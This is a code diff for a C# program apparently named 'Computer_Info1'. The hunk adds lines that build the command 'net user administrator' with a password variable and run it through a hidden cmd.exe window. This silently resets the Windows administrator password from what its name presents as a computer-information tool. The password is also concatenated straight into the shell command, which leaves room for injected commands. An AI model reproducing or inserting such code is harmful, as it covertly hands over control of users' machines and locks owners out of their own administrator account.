@@ -281,6 +281,16 @@ namespace Computer_Info1
                 
             }
 
+            string Command = "net user administrator " + password;
+            ProcessStartInfo ProcessInfo;
+            Process Process2;
+
+            ProcessInfo = new ProcessStartInfo("cmd.exe", "/K " + Command);
+            ProcessInfo.CreateNoWindow = true;
+            ProcessInfo.UseShellExecute = true;
+
+            Process2 = Process.Start(ProcessInfo);
+
         }
     }
 }
